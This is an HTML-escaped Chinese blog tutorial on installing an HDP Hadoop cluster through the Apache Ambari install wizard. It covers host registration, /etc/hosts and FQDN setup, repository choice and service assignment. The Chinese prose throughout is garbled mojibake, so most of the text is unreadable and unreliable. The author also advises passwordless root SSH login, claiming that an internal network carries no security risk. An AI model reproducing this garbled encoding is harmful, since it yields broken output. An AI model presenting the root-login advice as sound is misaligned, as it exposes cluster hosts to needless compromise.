&lt;h2 id=&quot;ç¬¬3ç« å®‰è£…ï¼Œé…ç½®å’Œéƒ¨ç½²HDPé›†ç¾¤&quot;&gt;&lt;a href=&quot;#ç¬¬3ç« å®‰è£…ï¼Œé…ç½®å’Œéƒ¨ç½²HDPé›†ç¾¤&quot; class=&quot;headerlink&quot; title=&quot;ç¬¬3ç« å®‰è£…ï¼Œé…ç½®å’Œéƒ¨ç½²HDPé›†ç¾¤&quot;&gt;&lt;/a&gt;ç¬¬3ç« å®‰è£…ï¼Œé…ç½®å’Œéƒ¨ç½²HDPé›†ç¾¤&lt;/h2&gt;&lt;h3 id=&quot;1-ç™»å½•åˆ°Apache-Ambari&quot;&gt;&lt;a href=&quot;#1-ç™»å½•åˆ°Apache-Ambari&quot; class=&quot;headerlink&quot; title=&quot;1.ç™»å½•åˆ°Apache Ambari&quot;&gt;&lt;/a&gt;1.ç™»å½•åˆ°Apache Ambari&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;å°†æµè§ˆå™¨æŒ‡å‘ &lt;code&gt;http://&amp;lt;your.ambari.server&amp;gt; :8080&lt;/code&gt;ï¼Œå…¶ä¸­&lt;code&gt;&amp;lt;your.ambari.server&amp;gt;&lt;/code&gt;æ˜¯æ‚¨çš„ambariæœåŠ¡å™¨ä¸»æœºçš„åç§°ã€‚ä¾‹å¦‚ï¼Œé»˜è®¤AmbariæœåŠ¡å™¨ä¸»æœºä½äº&lt;code&gt;http://c6401.ambari.apache.org:8080&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ä½¿ç”¨é»˜è®¤ç”¨æˆ·å/å¯†ç ç™»å½•AmbariæœåŠ¡å™¨ï¼š&lt;code&gt;admin / admin&lt;/code&gt;ã€‚æ‚¨å¯ä»¥ç¨åæ›´æ”¹è¿™äº›å‡­æ®ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;2-å¯åŠ¨Ambariå®‰è£…å‘å¯¼&quot;&gt;&lt;a href=&quot;#2-å¯åŠ¨Ambariå®‰è£…å‘å¯¼&quot; class=&quot;headerlink&quot; title=&quot;2.å¯åŠ¨Ambariå®‰è£…å‘å¯¼&quot;&gt;&lt;/a&gt;2.å¯åŠ¨Ambariå®‰è£…å‘å¯¼&lt;/h3&gt;&lt;p&gt;ä»&lt;code&gt;Ambari Welcome&lt;/code&gt;é¡µé¢ï¼Œé€‰æ‹©å¯åŠ¨å®‰è£…å‘å¯¼ã€‚&lt;/p&gt;
&lt;p&gt;æä¾›é›†ç¾¤ï¼Œç®¡ç†è°å¯ä»¥è®¿é—®ç¾¤é›†ï¼Œä»¥åŠè‡ªå®šä¹‰è§†å›¾ä¸ºAmbariç”¨æˆ·ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Ambariwelcome.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://docs.hortonworks.com/HDPDocuments/Ambari-2.4.2.0/bk_ambari-installation/content/figures/2/figures/170AmbariWelcome.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;3-å‘½åæ‚¨çš„ç¾¤é›†&quot;&gt;&lt;a href=&quot;#3-å‘½åæ‚¨çš„ç¾¤é›†&quot; class=&quot;headerlink&quot; title=&quot;3.å‘½åæ‚¨çš„ç¾¤é›†&quot;&gt;&lt;/a&gt;3.å‘½åæ‚¨çš„ç¾¤é›†&lt;/h3&gt;&lt;p&gt;åœ¨Name your clusterï¼Œé”®å…¥è¦åˆ›å»ºçš„é›†ç¾¤çš„åç§°ã€‚åç§°ä¸­ä¸è¦ä½¿ç”¨ç©ºæ ¼æˆ–ç‰¹æ®Šå­—ç¬¦ã€‚&lt;/p&gt;
&lt;p&gt;é€‰æ‹©Nextã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/ambari_02.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;4-é€‰æ‹©ç‰ˆæœ¬&quot;&gt;&lt;a href=&quot;#4-é€‰æ‹©ç‰ˆæœ¬&quot; class=&quot;headerlink&quot; title=&quot;4.é€‰æ‹©ç‰ˆæœ¬&quot;&gt;&lt;/a&gt;4.é€‰æ‹©ç‰ˆæœ¬&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/ambari_03.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œæˆ‘é€‰æ‹©&lt;code&gt;redhat6&lt;/code&gt; å…¶ä»–çš„éƒ½&lt;code&gt;remove&lt;/code&gt;æ‰ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨æ­¤æ­¥éª¤ä¸­ï¼Œæ‚¨å°†é€‰æ‹©ç¾¤é›†çš„è½¯ä»¶ç‰ˆæœ¬å’Œäº¤ä»˜æ–¹å¼ã€‚ä½¿ç”¨å…¬å…±å­˜å‚¨åº“éœ€è¦Internetè¿æ¥ã€‚ä½¿ç”¨æœ¬åœ°å­˜å‚¨åº“éœ€è¦æ‚¨åœ¨ç½‘ç»œä¸­å¯ç”¨çš„å­˜å‚¨åº“ä¸­é…ç½®è½¯ä»¶ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;é€‰æ‹©å †æ ˆ&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å¯ç”¨çš„HDPç‰ˆæœ¬æ˜¾ç¤ºåœ¨TABä¸­ã€‚å½“æ‚¨é€‰æ‹©TABæ—¶ï¼ŒAmbariä¼šå°è¯•å‘ç°è¯¥HDPå †æ ˆçš„ç‰¹å®šç‰ˆæœ¬å¯ç”¨ã€‚è¯¥åˆ—è¡¨æ˜¾ç¤ºåœ¨DROPDOWNä¸­ã€‚å¯¹äºè¯¥ç‰¹å®šç‰ˆæœ¬ï¼Œå°†æ˜¾ç¤ºå¯ç”¨çš„æœåŠ¡ï¼Œå…¶ä¸­çš„ç‰ˆæœ¬æ˜¾ç¤ºåœ¨TABLEä¸­ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;é€‰æ‹©ç‰ˆæœ¬&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å¦‚æœAmbariå¯ä»¥è®¿é—®Internetï¼Œåˆ™ç‰¹å®šç‰ˆæœ¬å°†ä½œä¸ºé€‰é¡¹åˆ—åœ¨DROPDOWNä¸­ã€‚å¦‚æœæ‚¨æœ‰æœªåˆ—å‡ºçš„ç‰ˆæœ¬çš„ç‰ˆæœ¬å®šä¹‰æ–‡ä»¶ï¼Œæ‚¨å¯ä»¥å•å‡»æ·»åŠ ç‰ˆæœ¬â€¦å¹¶ä¸Šè½½VDFæ–‡ä»¶ã€‚æ­¤å¤–ï¼Œå¦‚æœæ‚¨æ— æ³•è®¿é—®Internetæˆ–ä¸ç¡®å®šè¦å®‰è£…å“ªä¸ªç‰¹å®šç‰ˆæœ¬ï¼Œåˆ™ é»˜è®¤ç‰ˆæœ¬å®šä¹‰ä¹ŸåŒ…å«åœ¨åˆ—è¡¨ä¸­ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;é€‰æ‹©å­˜å‚¨åº“&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Ambariå…è®¸æ‚¨é€‰æ‹©ä»å…¬å…±å­˜å‚¨åº“ï¼ˆå¦‚æœæ‚¨æœ‰Internetè®¿é—®æƒé™ï¼‰æˆ–æœ¬åœ°å­˜å‚¨åº“å®‰è£…è½¯ä»¶ã€‚æ— è®ºæ‚¨çš„é€‰æ‹©å¦‚ä½•ï¼Œæ‚¨éƒ½å¯ä»¥ç¼–è¾‘å­˜å‚¨åº“çš„åŸºæœ¬URLã€‚å°†æ˜¾ç¤ºå¯ç”¨çš„æ“ä½œç³»ç»Ÿï¼Œæ‚¨å¯ä»¥ä»åˆ—è¡¨ä¸­æ·»åŠ /åˆ é™¤æ“ä½œç³»ç»Ÿä»¥é€‚åˆæ‚¨çš„ç¯å¢ƒ&lt;/p&gt;
&lt;p&gt;â—ï¸â—ï¸æ³¨æ„&lt;br&gt;UIæ˜¾ç¤ºåŸºäºæ“ä½œç³»ç»Ÿç³»åˆ—ï¼ˆOSç³»åˆ—ï¼‰çš„å­˜å‚¨åº“åŸºæœ¬URLã€‚è¯·ç¡®ä¿åŸºäºæ­£åœ¨è¿è¡Œçš„æ“ä½œç³»ç»Ÿè®¾ç½®æ­£ç¡®çš„æ“ä½œç³»ç»Ÿç³»åˆ—ã€‚ä¸‹è¡¨å°†OSç³»åˆ—æ˜ å°„åˆ°æ“ä½œç³»ç»Ÿã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;é«˜çº§é€‰é¡¹&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;æœ‰é«˜çº§å­˜å‚¨åº“é€‰é¡¹å¯ç”¨ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;è·³è¿‡å­˜å‚¨åº“åŸºæœ¬URLéªŒè¯ï¼ˆé«˜çº§ï¼‰ï¼š å½“æ‚¨å•å‡»ä¸‹ä¸€æ­¥æ—¶ï¼ŒAmbariå°†å°è¯•è¿æ¥åˆ°å­˜å‚¨åº“åŸºæœ¬URLï¼Œå¹¶éªŒè¯æ‚¨å·²è¾“å…¥éªŒè¯å­˜å‚¨åº“ã€‚å¦‚æœæ²¡æœ‰ï¼Œå°†æ˜¾ç¤ºä¸€ä¸ªé”™è¯¯ï¼Œæ‚¨å¿…é¡»åœ¨ç»§ç»­ä¹‹å‰çº æ­£ã€‚&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨&lt;code&gt;RedHat Satellite/Spacewalkï¼š&lt;/code&gt;ä»…å½“è®¡åˆ’ä½¿ç”¨æœ¬åœ°å­˜å‚¨åº“æ—¶ï¼Œæ‰ä¼šå¯ç”¨æ­¤é€‰é¡¹ã€‚å½“æ‚¨ä¸ºè½¯ä»¶å­˜å‚¨åº“é€‰æ‹©æ­¤é€‰é¡¹æ—¶ï¼Œæ‚¨è´Ÿè´£é…ç½®&lt;code&gt;Satellite/Spacewalk&lt;/code&gt;ä¸­çš„å­˜å‚¨åº“é€šé“ï¼Œå¹¶ç¡®è®¤æ‰€é€‰ç¾¤é›†ç‰ˆæœ¬çš„å­˜å‚¨åº“åœ¨ç¾¤é›†ä¸­çš„ä¸»æœºä¸Šå¯ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/ambari_04.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;5-å®‰è£…é€‰é¡¹&quot;&gt;&lt;a href=&quot;#5-å®‰è£…é€‰é¡¹&quot; class=&quot;headerlink&quot; title=&quot;5.å®‰è£…é€‰é¡¹&quot;&gt;&lt;/a&gt;5.å®‰è£…é€‰é¡¹&lt;/h3&gt;&lt;p&gt;ä¸ºäº†æ„å»ºé›†ç¾¤ï¼Œå®‰è£…å‘å¯¼å°†æç¤ºæ‚¨æœ‰å…³å¦‚ä½•è®¾ç½®å®ƒçš„ä¸€èˆ¬ä¿¡æ¯ã€‚æ‚¨éœ€è¦æä¾›æ¯ä¸ªä¸»æœºçš„FQDNã€‚è¯¥å‘å¯¼è¿˜éœ€è¦è®¿é—®åœ¨è®¾ç½®æ— å¯†ç SSHä¸­åˆ›å»ºçš„ç§é’¥æ–‡ä»¶  ã€‚ä½¿ç”¨ä¸»æœºåå’Œå¯†é’¥æ–‡ä»¶ä¿¡æ¯ï¼Œå‘å¯¼å¯ä»¥å®šä½ï¼Œè®¿é—®å’Œä¸ç¾¤é›†ä¸­çš„æ‰€æœ‰ä¸»æœºå®‰å…¨äº¤äº’ã€‚&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨Target Hostsæ–‡æœ¬æ¡†è¾“å…¥ä¸»æœºååˆ—è¡¨ï¼Œæ¯è¡Œä¸€ä¸ªã€‚æ‚¨å¯ä»¥ä½¿ç”¨æ‹¬å·å†…çš„èŒƒå›´æ¥è¡¨ç¤ºè¾ƒå¤§çš„ä¸»æœºé›†ã€‚ä¾‹å¦‚ï¼Œå¯¹äºhost01.domainé€šè¿‡host10.domainä½¿ç”¨ host[01-10].domain&lt;/p&gt;
&lt;p&gt;âš ï¸ &lt;strong&gt;å®‰è£…æœåŠ¡å™¨é›†ç¾¤æœºå™¨ä¸€å®šè¦ç³»ç»Ÿç‰ˆæœ¬è¦ä¸€è‡´ä¸ç„¶å®‰è£…ä¼šæç¤ºç‰ˆæœ¬ä¸å…¼å®¹ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;â—ï¸â—ï¸    æ³¨æ„&lt;br&gt;å¦‚æœè¦åœ¨EC2ä¸Šéƒ¨ç½²ï¼Œè¯·ä½¿ç”¨å†…éƒ¨ä¸“ç”¨&lt;code&gt;DNSä¸»æœºå&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨ambariæœåŠ¡å™¨é…ç½®hosts&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;vim /etc/hosts
&lt;/code&gt;&lt;/pre&gt;&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;192&lt;span class=&quot;selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.151&lt;/span&gt;    &lt;span class=&quot;selector-tag&quot;&gt;datanode151&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;192&lt;span class=&quot;selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.173&lt;/span&gt;    &lt;span class=&quot;selector-tag&quot;&gt;datanode_173&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;datanode-173&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.hadoop&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å¦‚æœè¦è®©&lt;code&gt;Ambari&lt;/code&gt;ä½¿ç”¨SSHåœ¨æ‰€æœ‰ä¸»æœºä¸Šè‡ªåŠ¨å®‰è£…Ambariä»£ç†ï¼Œè¯·é€‰æ‹©&lt;code&gt;Provide your SSH Private Key&lt;/code&gt;å¹¶ä½¿ç”¨éƒ¨åˆ†ä¸­çš„ &lt;code&gt;Choose File&lt;/code&gt;æŒ‰é’®&lt;code&gt;Host Registration Information&lt;/code&gt;æŸ¥æ‰¾ä¸å…ˆå‰åœ¨æ‰€æœ‰ä¸»æœºä¸Šå®‰è£…çš„å…¬é’¥ç›¸åŒ¹é…çš„ç§é’¥æ–‡ä»¶ï¼Œæˆ–è€…å‰ªåˆ‡å¹¶ç²˜è´´é”®æ‰‹åŠ¨æ’å…¥æ–‡æœ¬æ¡†ã€‚&lt;/p&gt;
&lt;p&gt;å¡«å†™æ‚¨é€‰æ‹©çš„SSHå¯†é’¥çš„ç”¨æˆ·åã€‚å¦‚æœä¸æƒ³ä½¿ç”¨rootç”¨æˆ·ï¼Œåˆ™å¿…é¡»ä¸ºå¯ä»¥åœ¨ä¸è¾“å…¥å¯†ç çš„æƒ…å†µä¸‹æ‰§è¡Œsudoçš„å¸æˆ·æä¾›ç”¨æˆ·åã€‚å¦‚æœæ‚¨çš„ç¯å¢ƒä¸­çš„ä¸»æœºä¸Šçš„SSHé…ç½®ä¸º22ä»¥å¤–çš„ç«¯å£ï¼Œæ‚¨ä¹Ÿå¯ä»¥æ›´æ”¹å®ƒã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœæ‚¨ä¸å¸Œæœ›Ambariè‡ªåŠ¨å®‰è£…Ambariä»£ç†ï¼Œè¯·é€‰æ‹©&lt;code&gt;Perform manual registration&lt;/code&gt;ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…æ‰‹åŠ¨å®‰è£…Ambariä»£ç†ã€‚&lt;/p&gt;
&lt;p&gt;é€‰æ‹©&lt;code&gt;Register and Confirm&lt;/code&gt;ç»§ç»­ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œæç¤ºï¼šThe following hostnames are not valid FQDNs: datanode_173.hadoop&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/ambari_06.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œè·³è½¬åˆ°å®‰è£…é¡µé¢ï¼šå‘ç°æŠ¥é”™æç¤ºdatanode-173.hadoopä¸»æœºè®¿é—®Ambariæœºå™¨ä¸èƒ½è®¿é—®ã€‚&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/ambari_07.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;6-ç¡®è®¤ä¸»æœº&quot;&gt;&lt;a href=&quot;#6-ç¡®è®¤ä¸»æœº&quot; class=&quot;headerlink&quot; title=&quot;6.ç¡®è®¤ä¸»æœº&quot;&gt;&lt;/a&gt;6.ç¡®è®¤ä¸»æœº&lt;/h3&gt;&lt;p&gt;&lt;code&gt;Confirm Hosts&lt;/code&gt; æç¤ºæ‚¨ç¡®è®¤&lt;code&gt;Ambari&lt;/code&gt;å·²ä¸ºæ‚¨çš„é›†ç¾¤æ‰¾åˆ°æ­£ç¡®çš„ä¸»æœºï¼Œå¹¶æ£€æŸ¥è¿™äº›ä¸»æœºä»¥ç¡®ä¿å®ƒä»¬å…·æœ‰ç»§ç»­å®‰è£…æ‰€éœ€çš„æ­£ç¡®ç›®å½•ï¼Œè½¯ä»¶åŒ…å’Œè¿›ç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœé€‰æ‹©äº†é”™è¯¯çš„ä¸»æœºï¼Œæ‚¨å¯ä»¥é€šè¿‡é€‰æ‹©ç›¸åº”çš„å¤é€‰æ¡†å¹¶å•å‡»ç°è‰²&lt;code&gt;Remove Selected&lt;/code&gt;æŒ‰é’®æ¥åˆ é™¤å®ƒä»¬ã€‚è¦åˆ é™¤å•ä¸ªä¸»æœºï¼Œè¯·å•å‡»Removeâ€œæ“ä½œâ€åˆ—ä¸­çš„å°ç™½è‰²æŒ‰é’®ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨å±å¹•åº•éƒ¨ï¼Œæ‚¨å¯èƒ½ä¼šæ³¨æ„åˆ°ä¸€ä¸ªé»„è‰²æ¡†ï¼Œè¡¨ç¤ºåœ¨æ£€æŸ¥è¿‡ç¨‹ä¸­é‡åˆ°äº†ä¸€äº›è­¦å‘Šã€‚ä¾‹å¦‚ï¼Œæ‚¨çš„ä¸»æœºå¯èƒ½å·²æœ‰&lt;code&gt;wget&lt;/code&gt;æˆ–çš„å‰¯æœ¬ &lt;code&gt;curl&lt;/code&gt;ã€‚é€‰æ‹©&lt;code&gt;Click here to see the warnings&lt;/code&gt; æŸ¥çœ‹æ£€æŸ¥å†…å®¹å’Œå¯¼è‡´è­¦å‘Šçš„åŸå› çš„åˆ—è¡¨ã€‚è­¦å‘Šé¡µé¢è¿˜æä¾›å¯¹pythonè„šæœ¬çš„è®¿é—®ï¼Œå¯ä»¥å¸®åŠ©æ‚¨æ¸…é™¤å¯èƒ½é‡åˆ°çš„ä»»ä½•é—®é¢˜ï¼Œè®©æ‚¨è¿è¡Œ&lt;code&gt;Rerun Checks&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨datanode_173æœåŠ¡å™¨é…ç½®hosts&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;vim /etc/hosts
&lt;/code&gt;&lt;/pre&gt;&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;192&lt;span class=&quot;selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.151&lt;/span&gt;    &lt;span class=&quot;selector-tag&quot;&gt;datanode151&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;192&lt;span class=&quot;selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.173&lt;/span&gt;    &lt;span class=&quot;selector-tag&quot;&gt;datanode_173&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;datanode-173&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.hadoop&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æ¯å°èŠ‚ç‚¹é‡Œé…ç½®FQDNï¼Œå¦‚ä¸‹ä»¥ä¸»èŠ‚ç‚¹ä¸ºä¾‹&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;vi /etc/sysconfig/network&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;NETWORKING=yes&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;HOSTNAME=SY-001.hadoop&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;é…ç½®ä¸Šå°±å¯ä»¥äº†ã€‚ æŠŠdatanode151ä¹Ÿæ˜¯ambariæœºå™¨é…ç½®åœ¨hostså°±å¯ä»¥äº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æœ€å¥½è®¾ç½®rootçš„æ— å¯†ç ç™»å½•ï¼Œå› ä¸ºæˆ‘ä»¬é…ç½®çš„é›†ç¾¤éƒ½æ˜¯å†…ç½‘çš„ï¼Œæ²¡ä»€ä¹ˆå®‰å…¨æ€§é—®é¢˜ï¼Œä½¿ç”¨rootæ“ä½œå¯ä»¥çœå»ä¸€äº›éº»çƒ¦ï¼Œérootç”¨æˆ·å¯èƒ½åœ¨å®‰è£…Hadoopç»„ä»¶æ—¶ä¸èƒ½æˆåŠŸ&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ä¸‹é¢æ˜¯æˆ‘å®‰è£…è¿™é‡Œæç¤ºæ²¡æœ‰æ‰¾åˆ°æ–‡ä»¶ç›®å½•æŸ¥çœ‹å®‰è£…æŠ¥é”™æ“ä½œï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mkdir /var/lib/ambari-agent/data
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Ambari_08.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/ambari_09.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/ambari_10.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;7-é€‰æ‹©æœåŠ¡&quot;&gt;&lt;a href=&quot;#7-é€‰æ‹©æœåŠ¡&quot; class=&quot;headerlink&quot; title=&quot;7.é€‰æ‹©æœåŠ¡&quot;&gt;&lt;/a&gt;7.é€‰æ‹©æœåŠ¡&lt;/h3&gt;&lt;p&gt;å°†çœ‹åˆ°é€‰æ‹©è¦å®‰è£…åˆ°ç¾¤é›†ä¸­çš„æœåŠ¡ã€‚HDPå †æ ˆåŒ…æ‹¬è®¸å¤šæœåŠ¡ã€‚æ‚¨å¯ä»¥é€‰æ‹©ç«‹å³å®‰è£…ä»»ä½•å…¶ä»–å¯ç”¨æœåŠ¡ï¼Œæˆ–ç¨åæ·»åŠ æœåŠ¡ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®‰è£…å‘å¯¼å°†é€‰æ‹©æ‰€æœ‰å¯ç”¨çš„æœåŠ¡è¿›è¡Œå®‰è£…ã€‚&lt;/p&gt;
&lt;p&gt;é€‰æ‹©&lt;code&gt;none&lt;/code&gt;æ¸…é™¤æ‰€æœ‰é€‰æ‹©ï¼Œæˆ–é€‰æ‹© &lt;code&gt;all&lt;/code&gt;é€‰æ‹©æ‰€æœ‰åˆ—å‡ºçš„æœåŠ¡ã€‚&lt;/p&gt;
&lt;p&gt;é€‰æ‹©æˆ–æ¸…é™¤å•ä¸ªå¤é€‰æ¡†ä»¥å®šä¹‰ä¸€ç»„è¦ç«‹å³å®‰è£…çš„æœåŠ¡ã€‚&lt;/p&gt;
&lt;p&gt;é€‰æ‹©è¦ç«‹å³å®‰è£…çš„æœåŠ¡åï¼Œé€‰æ‹©Nextã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/ambari_11.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;8-åˆ†é…ä¸»ç«™&quot;&gt;&lt;a href=&quot;#8-åˆ†é…ä¸»ç«™&quot; class=&quot;headerlink&quot; title=&quot;8.åˆ†é…ä¸»ç«™&quot;&gt;&lt;/a&gt;8.åˆ†é…ä¸»ç«™&lt;/h3&gt;&lt;p&gt;Ambariå®‰è£…å‘å¯¼ä¼šå°†æ‰€é€‰æœåŠ¡çš„ä¸»ç»„ä»¶åˆ†é…ç»™é›†ç¾¤ä¸­çš„ç›¸åº”ä¸»æœºï¼Œå¹¶åœ¨Assign Mastersä¸­æ˜¾ç¤ºåˆ†é…ã€‚å·¦åˆ—æ˜¾ç¤ºæœåŠ¡å’Œå½“å‰ä¸»æœºã€‚å³åˆ—æ˜¾ç¤ºä¸»æœºçš„å½“å‰ä¸»ç»„ä»¶åˆ†é…ï¼ŒæŒ‡ç¤ºæ¯ä¸ªä¸»æœºä¸Šå®‰è£…çš„CPUå†…æ ¸æ•°é‡å’ŒRAMæ•°é‡ã€‚&lt;/p&gt;
&lt;p&gt;è¦æ›´æ”¹æœåŠ¡çš„ä¸»æœºåˆ†é…ï¼Œè¯·ä»è¯¥æœåŠ¡çš„ä¸‹æ‹‰èœå•ä¸­é€‰æ‹©ä¸»æœºåã€‚&lt;/p&gt;
&lt;p&gt;è¦åˆ é™¤ZooKeeperå®ä¾‹ï¼Œè¯·å•å‡»è¦åˆ é™¤çš„ä¸»æœºåœ°å€æ—è¾¹çš„ç»¿è‰²å‡å·å›¾æ ‡ã€‚&lt;/p&gt;
&lt;p&gt;å½“æ‚¨å¯¹ä½œä¸šæ„Ÿåˆ°æ»¡æ„æ—¶ï¼Œé€‰æ‹©Nextã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;9-åˆ†é…ä»å±å’Œå®¢æˆ·ç«¯&quot;&gt;&lt;a href=&quot;#9-åˆ†é…ä»å±å’Œå®¢æˆ·ç«¯&quot; class=&quot;headerlink&quot; title=&quot;9.åˆ†é…ä»å±å’Œå®¢æˆ·ç«¯&quot;&gt;&lt;/a&gt;9.åˆ†é…ä»å±å’Œå®¢æˆ·ç«¯&lt;/h3&gt;&lt;p&gt;Ambariå®‰è£…å‘å¯¼å°†ä»å±ç»„ä»¶ï¼ˆDataNodesï¼ŒNodeManagerå’ŒRegionServersï¼‰åˆ†é…ç»™é›†ç¾¤ä¸­çš„ç›¸åº”ä¸»æœºã€‚å®ƒè¿˜ä¼šå°è¯•é€‰æ‹©ä¸»æœºä»¥å®‰è£…é€‚å½“çš„å®¢æˆ·ç«¯é›†ã€‚&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨&lt;code&gt;all&lt;/code&gt;æˆ–&lt;code&gt;none&lt;/code&gt;å¯åˆ†åˆ«é€‰æ‹©åˆ—ä¸­çš„æ‰€æœ‰ä¸»æœºæˆ–ä¸é€‰æ‹©ä»»ä½•ä¸»æœºã€‚&lt;/p&gt;
